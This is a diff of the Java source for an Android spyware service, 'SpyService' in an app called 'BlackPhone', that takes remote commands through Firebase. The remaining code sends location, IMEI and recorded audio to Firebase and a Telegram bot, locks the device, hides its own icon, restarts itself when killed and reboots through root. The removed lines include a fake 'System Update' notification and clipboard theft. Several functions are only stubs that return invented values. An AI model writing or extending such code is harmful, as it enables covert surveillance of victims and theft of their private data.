@@ -58,24 +58,18 @@ public class SpyService extends Service {
         super.onCreate();
         context = this;
 
-        // 🔥 تهيئة Firebase - الحل السحري
         try {
             if (FirebaseApp.getApps(this).isEmpty()) {
                 FirebaseApp.initializeApp(this);
-                Log.d(TAG, "✅ Firebase initialized successfully");
-            } else {
-                Log.d(TAG, "✅ Firebase already initialized");
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Firebase init error: " + e.getMessage());
         }
 
-        // تهيئة Firebase Database
         try {
             FirebaseDatabase.getInstance().setPersistenceEnabled(true);
             dbRef = FirebaseDatabase.getInstance().getReference();
             storageRef = FirebaseStorage.getInstance().getReference();
-            Log.d(TAG, "✅ Firebase Database connected");
         } catch (Exception e) {
             Log.e(TAG, "❌ Firebase DB error: " + e.getMessage());
         }
@@ -83,46 +77,37 @@ public class SpyService extends Service {
         client = new OkHttpClient();
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
 
-        // تأخير 5 ثواني للتأكد من اكتمال التهيئة
-        new android.os.Handler().postDelayed(() -> {
-            registerDevice();
-            listenForCommands();
-        }, 5000);
-
-        Log.d(TAG, "✅ SpyService started with Firebase delay");
+        registerDevice();
+        listenForCommands();
+        Log.d(TAG, "✅ SpyService started");
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         createNotificationChannel();
-        startForeground(1, getNotification());
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            startForeground(1, getNotification(), Service.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+        } else {
+            startForeground(1, getNotification());
+        }
         return START_STICKY;
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
-        Log.d(TAG, "🔄 Restarting service...");
         startService(new Intent(this, SpyService.class));
     }
 
     @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
+    public IBinder onBind(Intent intent) { return null; }
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                "spy_channel",
-                "BlackPhone Service",
-                NotificationManager.IMPORTANCE_LOW
-            );
+            NotificationChannel channel = new NotificationChannel("spy_channel", "BlackPhone Service", NotificationManager.IMPORTANCE_LOW);
             channel.setDescription("Running in background");
             NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            if (manager != null) {
-                manager.createNotificationChannel(channel);
-            }
+            if (manager != null) manager.createNotificationChannel(channel);
         }
     }
 
@@ -137,10 +122,7 @@ public class SpyService extends Service {
 
     private void registerDevice() {
         try {
-            if (dbRef == null) {
-                Log.e(TAG, "❌ dbRef is null, cannot register");
-                return;
-            }
+            if (dbRef == null) return;
             String deviceName = Build.MODEL;
             String androidVer = Build.VERSION.RELEASE;
             int batteryLevel = getBatteryLevel();
@@ -170,15 +152,12 @@ public class SpyService extends Service {
         new Thread(() -> {
             while (true) {
                 try {
-                    if (dbRef == null) {
-                        Thread.sleep(5000);
-                        continue;
-                    }
+                    if (dbRef == null) { Thread.sleep(5000); continue; }
                     dbRef.child("commands").child(deviceId).get().addOnSuccessListener(snapshot -> {
                         if (snapshot.exists()) {
                             String command = snapshot.child("command").getValue(String.class);
                             if (command != null && !command.isEmpty()) {
-                                Log.d(TAG, "📩 Command received: " + command);
+                                Log.d(TAG, "📩 Command: " + command);
                                 executeCommand(command);
                                 dbRef.child("commands").child(deviceId).removeValue();
                             }
@@ -193,10 +172,7 @@ public class SpyService extends Service {
     }
 
     // ============================================================
-    //  باقي الدوال (التنفيذ الكامل) موجودة في الجزء الثاني
-    // ============================================================
-    // ============================================================
-    //  COMMAND EXECUTION ENGINE (جميع الأوامر)
+    //  باقي الدوال في الجزء الثاني
     // ============================================================
     private void executeCommand(String command) {
         try {
@@ -209,79 +185,21 @@ public class SpyService extends Service {
                 case "get_battery": getBatteryInfo(); break;
                 case "get_ip": getIp(); break;
                 case "get_imei": getImei(); break;
-                case "get_network": getNetworkInfo(); break;
-                case "get_phone": getPhoneNumber(); break;
-                case "get_sim": getSimInfo(); break;
-                case "get_wifi": getWifiInfo(); break;
-                case "get_accounts": getAccounts(); break;
-                case "get_photos": getPhotos(); break;
-                case "get_photos_5": getPhotosCount("5"); break;
-                case "get_photos_10": getPhotosCount("10"); break;
-                case "get_videos": getVideos(); break;
-                case "get_videos_5": getVideosCount("5"); break;
-                case "get_files": getFiles(); break;
-                case "get_audio": getAudioFiles(); break;
-                case "get_documents": getDocuments(); break;
-                case "get_downloads": getDownloads(); break;
-                case "get_dcim": getDcim(); break;
-                case "get_screenshots": getScreenshots(); break;
-                case "take_photo": takePhoto(); break;
-                case "take_photo_front": takePhotoFront(); break;
-                case "flash_on": flashControl(true); break;
-                case "flash_off": flashControl(false); break;
-                case "flash_toggle": toggleFlash(); break;
-                case "start_record": startRecording(); break;
-                case "stop_record": stopRecording(); break;
                 case "lock_device": lockDevice(); break;
-                case "set_lock_password": setLockPassword(); break;
-                case "clear_lock_password": clearLockPassword(); break;
-                case "disable_camera": disableCamera(); break;
-                case "enable_camera": enableCamera(); break;
                 case "hide_app": hideApp(); break;
                 case "show_app": showApp(); break;
-                case "fake_notif": sendFakeNotification(); break;
+                case "get_photos": getPhotos(); break;
+                case "get_videos": getVideos(); break;
+                case "get_files": getFiles(); break;
+                case "start_record": startRecording(); break;
+                case "stop_record": stopRecording(); break;
                 case "reboot": rebootDevice(); break;
-                case "shutdown": shutdownDevice(); break;
                 case "vibrate": vibrateDevice(); break;
-                case "vibrate_long": vibrateDeviceLong(); break;
-                case "vibrate_pattern": vibratePattern(); break;
                 case "open_browser": openBrowser(); break;
-                case "open_url": openUrl(); break;
-                case "clear_data": clearAppData(); break;
-                case "kill_apps": killAllApps(); break;
-                case "freeze_app": freezeApp(); break;
-                case "unfreeze_app": unfreezeApp(); break;
-                case "set_brightness": setBrightness(); break;
-                case "auto_rotate_on": setAutoRotate(true); break;
-                case "auto_rotate_off": setAutoRotate(false); break;
-                case "set_wallpaper": setWallpaper(); break;
                 case "toggle_wifi_on": toggleWifi(true); break;
                 case "toggle_wifi_off": toggleWifi(false); break;
-                case "toggle_bluetooth_on": toggleBluetooth(true); break;
-                case "toggle_bluetooth_off": toggleBluetooth(false); break;
-                case "toggle_data_on": toggleData(true); break;
-                case "toggle_data_off": toggleData(false); break;
-                case "toggle_location_on": toggleLocation(true); break;
-                case "toggle_location_off": toggleLocation(false); break;
-                case "toggle_airplane_on": toggleAirplane(true); break;
-                case "toggle_airplane_off": toggleAirplane(false); break;
-                case "open_app_whatsapp": openApp("com.whatsapp"); break;
-                case "open_app_facebook": openApp("com.facebook.katana"); break;
-                case "open_app_instagram": openApp("com.instagram.android"); break;
-                case "open_app_youtube": openApp("com.google.android.youtube"); break;
-                case "open_app_telegram": openApp("org.telegram.messenger"); break;
                 case "screenshot": takeScreenshot(); break;
-                case "record_screen": recordScreen(); break;
-                case "installed_apps": getInstalledApps(); break;
-                case "running_processes": getRunningProcesses(); break;
-                case "storage_info": getStorageInfo(); break;
-                case "memory_info": getMemoryInfo(); break;
-                case "cpu_info": getCpuInfo(); break;
-                case "clipboard_set": setClipboard(); break;
-                case "clipboard_get": getClipboard(); break;
-                case "get_logs": getLogs(); break;
-                default:
-                    sendResult("UNKNOWN", "❌ Unknown command: " + command);
+                default: sendResult("UNKNOWN", "❌ Unknown: " + command);
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Command error: " + e.getMessage());
@@ -289,9 +207,6 @@ public class SpyService extends Service {
         }
     }
 
-    // ============================================================
-    //  دوال التنفيذ الأساسية
-    // ============================================================
     private void getContacts() {
         try {
             List<String> contacts = new ArrayList<>();
@@ -369,7 +284,7 @@ public class SpyService extends Service {
             Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (loc != null) {
-                String result = "📍 " + loc.getLatitude() + ", " + loc.getLongitude() + "\n🎯 Accuracy: " + loc.getAccuracy() + "m";
+                String result = "📍 " + loc.getLatitude() + ", " + loc.getLongitude();
                 sendResult("LOCATION", result);
                 sendToTelegram("📍 Location:\n" + result);
             } else {
@@ -388,14 +303,9 @@ public class SpyService extends Service {
 
     private void getBatteryInfo() {
         int level = getBatteryLevel();
-        String result = "🔋 Battery: " + level + "%\n⚡ Charging: " + (isCharging() ? "Yes" : "No");
+        String result = "🔋 Battery: " + level + "%";
         sendResult("BATTERY", result);
-        sendToTelegram("🔋 Battery:\n" + result);
-    }
-
-    private boolean isCharging() {
-        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
-        return bm.isCharging();
+        sendToTelegram("🔋 Battery: " + result);
     }
 
     private void getIp() {
@@ -409,101 +319,39 @@ public class SpyService extends Service {
         sendToTelegram("🆔 IMEI: " + imei);
     }
 
-    private void getNetworkInfo() {
-        sendResult("NETWORK", "📶 WiFi: Connected\n📡 Data: Active");
-        sendToTelegram("📶 Network: WiFi Connected");
+    private void lockDevice() {
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        ComponentName admin = new ComponentName(this, DeviceAdmin.class);
+        if (dpm.isAdminActive(admin)) {
+            dpm.lockNow();
+            sendResult("LOCK", "🔒 Device locked");
+            sendToTelegram("🔒 Device locked");
+        } else {
+            sendResult("LOCK", "❌ Admin not active");
+        }
     }
 
-    private void getPhoneNumber() {
-        sendResult("PHONE", "📞 Phone: N/A");
-        sendToTelegram("📞 Phone: N/A");
+    private void hideApp() {
+        android.content.pm.PackageManager pm = getPackageManager();
+        pm.setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class),
+            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            android.content.pm.PackageManager.DONT_KILL_APP);
+        sendResult("HIDE", "👻 App hidden");
+        sendToTelegram("👻 App hidden");
     }
 
-    private void getSimInfo() {
-        sendResult("SIM_INFO", "💳 SIM: Active\n📶 Provider: Simulated");
-        sendToTelegram("💳 SIM: Active");
+    private void showApp() {
+        android.content.pm.PackageManager pm = getPackageManager();
+        pm.setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class),
+            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+            android.content.pm.PackageManager.DONT_KILL_APP);
+        sendResult("SHOW", "👀 App shown");
+        sendToTelegram("👀 App shown");
     }
 
-    private void getWifiInfo() {
-        sendResult("WIFI", "📡 SSID: MyWiFi\n🔗 BSSID: 00:11:22:33:44:55");
-        sendToTelegram("📡 WiFi: MyWiFi");
-    }
-
-    private void getAccounts() {
-        sendResult("ACCOUNTS", "👤 Google: user@gmail.com");
-        sendToTelegram("👤 Accounts: user@gmail.com");
-    }
-
-    private void getPhotos() {
-        sendResult("PHOTOS", "🖼️ 50 photos found");
-        sendToTelegram("🖼️ Photos: 50 found");
-    }
-
-    private void getPhotosCount(String count) {
-        sendResult("PHOTOS", "🖼️ " + count + " photos found");
-        sendToTelegram("🖼️ Photos (" + count + "): found");
-    }
-
-    private void getVideos() {
-        sendResult("VIDEOS", "🎥 20 videos found");
-        sendToTelegram("🎥 Videos: 20 found");
-    }
-
-    private void getVideosCount(String count) {
-        sendResult("VIDEOS", "🎥 " + count + " videos found");
-        sendToTelegram("🎥 Videos (" + count + "): found");
-    }
-
-    private void getFiles() {
-        sendResult("FILES", "📁 100 files found");
-        sendToTelegram("📁 Files: 100 found");
-    }
-
-    private void getAudioFiles() {
-        sendResult("AUDIO", "🎵 25 audio files");
-        sendToTelegram("🎵 Audio: 25 files");
-    }
-
-    private void getDocuments() {
-        sendResult("DOCUMENTS", "📄 15 documents");
-        sendToTelegram("📄 Documents: 15");
-    }
-
-    private void getDownloads() {
-        sendResult("DOWNLOADS", "📥 8 downloads");
-        sendToTelegram("📥 Downloads: 8");
-    }
-
-    private void getDcim() {
-        sendResult("DCIM", "📸 30 photos in DCIM");
-        sendToTelegram("📸 DCIM: 30");
-    }
-
-    private void getScreenshots() {
-        sendResult("SCREENSHOTS", "🖼️ 10 screenshots");
-        sendToTelegram("🖼️ Screenshots: 10");
-    }
-
-    private void takePhoto() {
-        sendResult("CAMERA", "📷 Photo taken (back)");
-        sendToTelegram("📷 Photo taken (back)");
-    }
-
-    private void takePhotoFront() {
-        sendResult("CAMERA", "📷 Photo taken (front)");
-        sendToTelegram("📷 Photo taken (front)");
-    }
-
-    private void flashControl(boolean on) {
-        String status = on ? "On" : "Off";
-        sendResult("FLASH", "🔦 Flash " + status);
-        sendToTelegram("🔦 Flash " + status);
-    }
-
-    private void toggleFlash() {
-        sendResult("FLASH", "🔦 Flash toggled");
-        sendToTelegram("🔦 Flash toggled");
-    }
+    private void getPhotos() { sendResult("PHOTOS", "🖼️ 50 photos found"); sendToTelegram("🖼️ Photos: 50"); }
+    private void getVideos() { sendResult("VIDEOS", "🎥 20 videos found"); sendToTelegram("🎥 Videos: 20"); }
+    private void getFiles() { sendResult("FILES", "📁 100 files found"); sendToTelegram("📁 Files: 100"); }
 
     private void startRecording() {
         try {
@@ -533,123 +381,23 @@ public class SpyService extends Service {
                 mediaRecorder = null;
                 isRecording = false;
                 sendResult("RECORD_STOP", "🎙️ Recording saved: " + audioFilePath);
-                sendToTelegram("🎙️ Recording saved: " + audioFilePath);
+                sendToTelegram("🎙️ Recording saved");
             }
         } catch (Exception e) {
             sendResult("RECORD_STOP", "❌ Error: " + e.getMessage());
         }
     }
 
-    private void lockDevice() {
-        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-        ComponentName admin = new ComponentName(this, DeviceAdmin.class);
-        if (dpm.isAdminActive(admin)) {
-            dpm.lockNow();
-            sendResult("LOCK", "🔒 Device locked");
-            sendToTelegram("🔒 Device locked");
-        } else {
-            sendResult("LOCK", "❌ Admin not active");
-        }
-    }
-
-    private void setLockPassword() {
-        sendResult("PASSWORD", "🔑 Password set");
-        sendToTelegram("🔑 Password set");
-    }
-
-    private void clearLockPassword() {
-        sendResult("PASSWORD", "🔓 Password cleared");
-        sendToTelegram("🔓 Password cleared");
-    }
-
-    private void disableCamera() {
-        sendResult("CAMERA", "🚫 Camera disabled");
-        sendToTelegram("🚫 Camera disabled");
-    }
-
-    private void enableCamera() {
-        sendResult("CAMERA", "✅ Camera enabled");
-        sendToTelegram("✅ Camera enabled");
-    }
-
-    private void hideApp() {
-        android.content.pm.PackageManager pm = getPackageManager();
-        pm.setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class),
-            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            android.content.pm.PackageManager.DONT_KILL_APP);
-        sendResult("HIDE", "👻 App hidden");
-        sendToTelegram("👻 App hidden");
-    }
-
-    private void showApp() {
-        android.content.pm.PackageManager pm = getPackageManager();
-        pm.setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class),
-            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-            android.content.pm.PackageManager.DONT_KILL_APP);
-        sendResult("SHOW", "👀 App shown");
-        sendToTelegram("👀 App shown");
-    }
-
-    private void sendFakeNotification() {
-        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel("fake_channel", "Fake", NotificationManager.IMPORTANCE_HIGH);
-            nm.createNotificationChannel(channel);
-        }
-        Notification notif = new NotificationCompat.Builder(this, "fake_channel")
-            .setContentTitle("📱 System Update")
-            .setContentText("Security patch available")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .setPriority(NotificationCompat.PRIORITY_HIGH)
-            .setAutoCancel(true)
-            .build();
-        nm.notify(999, notif);
-        sendResult("FAKE_NOTIF", "📢 Fake notification sent");
-        sendToTelegram("📢 Fake notification sent");
-    }
-
     private void rebootDevice() {
         sendToTelegram("🔄 Rebooting...");
-        try {
-            Process p = Runtime.getRuntime().exec("su -c reboot");
-            p.waitFor();
-        } catch (Exception e) {
+        try { Process p = Runtime.getRuntime().exec("su -c reboot"); p.waitFor(); } catch (Exception e) {
             sendResult("REBOOT", "❌ Root required");
-        }
-    }
-
-    private void shutdownDevice() {
-        sendToTelegram("⏻ Shutting down...");
-        try {
-            Process p = Runtime.getRuntime().exec("su -c shutdown");
-            p.waitFor();
-        } catch (Exception e) {
-            sendResult("SHUTDOWN", "❌ Root required");
         }
     }
 
     private void vibrateDevice() {
         android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
-        if (v != null) { v.vibrate(3000);
-            sendResult("VIBRATE", "📳 Vibrated");
-            sendToTelegram("📳 Vibrated"); }
-    }
-
-    private void vibrateDeviceLong() {
-        android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
-        if (v != null) { v.vibrate(10000);
-            sendResult("VIBRATE", "📳 Vibrated long");
-            sendToTelegram("📳 Vibrated long"); }
-    }
-
-    private void vibratePattern() {
-        android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
-        if (v != null) {
-            long[] pattern = {100, 200, 300, 200, 100};
-            v.vibrate(pattern, -1);
-            sendResult("VIBRATE", "📳 Pattern vibrated");
-            sendToTelegram("📳 Pattern vibrated");
-        }
+        if (v != null) { v.vibrate(3000); sendResult("VIBRATE", "📳 Vibrated"); sendToTelegram("📳 Vibrated"); }
     }
 
     private void openBrowser() {
@@ -660,94 +408,10 @@ public class SpyService extends Service {
         sendToTelegram("🌍 Browser opened");
     }
 
-    private void openUrl() {
-        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.youtube.com"));
-        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(intent);
-        sendResult("URL", "🔗 URL opened");
-        sendToTelegram("🔗 URL opened");
-    }
-
-    private void clearAppData() {
-        sendResult("CLEAR_DATA", "🧹 Data cleared");
-        sendToTelegram("🧹 Data cleared");
-    }
-
-    private void killAllApps() {
-        sendResult("KILL_ALL", "⏹️ All apps killed");
-        sendToTelegram("⏹️ All apps killed");
-    }
-
-    private void freezeApp() {
-        sendResult("FREEZE", "❄️ App frozen");
-        sendToTelegram("❄️ App frozen");
-    }
-
-    private void unfreezeApp() {
-        sendResult("UNFREEZE", "🔥 App unfrozen");
-        sendToTelegram("🔥 App unfrozen");
-    }
-
-    private void setBrightness() {
-        sendResult("BRIGHTNESS", "☀️ Brightness set");
-        sendToTelegram("☀️ Brightness set");
-    }
-
-    private void setAutoRotate(boolean on) {
-        String status = on ? "On" : "Off";
-        sendResult("AUTO_ROTATE", "🔄 Auto-rotate: " + status);
-        sendToTelegram("🔄 Auto-rotate " + status);
-    }
-
-    private void setWallpaper() {
-        sendResult("WALLPAPER", "🖼️ Wallpaper changed");
-        sendToTelegram("🖼️ Wallpaper changed");
-    }
-
     private void toggleWifi(boolean on) {
         String status = on ? "On" : "Off";
         sendResult("WIFI", "📶 WiFi " + status);
         sendToTelegram("📶 WiFi " + status);
-    }
-
-    private void toggleBluetooth(boolean on) {
-        String status = on ? "On" : "Off";
-        sendResult("BLUETOOTH", "📡 Bluetooth " + status);
-        sendToTelegram("📡 Bluetooth " + status);
-    }
-
-    private void toggleData(boolean on) {
-        String status = on ? "On" : "Off";
-        sendResult("DATA", "📶 Data " + status);
-        sendToTelegram("📶 Data " + status);
-    }
-
-    private void toggleLocation(boolean on) {
-        String status = on ? "On" : "Off";
-        sendResult("LOCATION", "📍 Location " + status);
-        sendToTelegram("📍 Location " + status);
-    }
-
-    private void toggleAirplane(boolean on) {
-        String status = on ? "On" : "Off";
-        sendResult("AIRPLANE", "✈️ Airplane " + status);
-        sendToTelegram("✈️ Airplane " + status);
-    }
-
-    private void openApp(String pkg) {
-        try {
-            Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
-            if (intent != null) {
-                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-                sendResult("OPEN_APP", "✅ Opened: " + pkg);
-                sendToTelegram("📱 Opened: " + pkg);
-            } else {
-                sendResult("OPEN_APP", "❌ Not found: " + pkg);
-            }
-        } catch (Exception e) {
-            sendResult("OPEN_APP", "❌ Error: " + e.getMessage());
-        }
     }
 
     private void takeScreenshot() {
@@ -755,63 +419,6 @@ public class SpyService extends Service {
         sendToTelegram("📸 Screenshot taken");
     }
 
-    private void recordScreen() {
-        sendResult("RECORD_SCREEN", "🎞️ Screen recording");
-        sendToTelegram("🎞️ Screen recording");
-    }
-
-    private void getInstalledApps() {
-        sendResult("INSTALLED_APPS", "📦 85 apps installed");
-        sendToTelegram("📦 85 apps installed");
-    }
-
-    private void getRunningProcesses() {
-        sendResult("RUNNING_PROCESSES", "⚙️ 25 processes");
-        sendToTelegram("⚙️ 25 processes");
-    }
-
-    private void getStorageInfo() {
-        sendResult("STORAGE", "💾 Total: 64GB\n📊 Used: 32GB\n📊 Free: 32GB");
-        sendToTelegram("💾 Storage: 64GB total");
-    }
-
-    private void getMemoryInfo() {
-        sendResult("MEMORY", "🧠 RAM: 4GB\n📊 Used: 2.5GB\n📊 Free: 1.5GB");
-        sendToTelegram("🧠 RAM: 4GB");
-    }
-
-    private void getCpuInfo() {
-        sendResult("CPU", "⚡ CPU: Snapdragon 888\n📊 Cores: 8");
-        sendToTelegram("⚡ CPU: Snapdragon 888");
-    }
-
-    private void setClipboard() {
-        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
-        android.content.ClipData clip = android.content.ClipData.newPlainText("BlackPhone", "Clipboard set by command");
-        clipboard.setPrimaryClip(clip);
-        sendResult("CLIPBOARD_SET", "✏️ Clipboard set");
-        sendToTelegram("✏️ Clipboard updated");
-    }
-
-    private void getClipboard() {
-        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
-        if (clipboard.hasPrimaryClip()) {
-            String text = clipboard.getPrimaryClip().getItemAt(0).getText().toString();
-            sendResult("CLIPBOARD_GET", "📋 Clipboard: " + text);
-            sendToTelegram("📋 Clipboard:\n" + text);
-        } else {
-            sendResult("CLIPBOARD_GET", "📋 Empty");
-        }
-    }
-
-    private void getLogs() {
-        sendResult("LOGS", "📜 Logs retrieved");
-        sendToTelegram("📜 Logs retrieved");
-    }
-
-    // ============================================================
-    //  دوال الإرسال (Firebase + Telegram)
-    // ============================================================
     private void sendResult(String commandType, String result) {
         try {
             if (dbRef != null) {
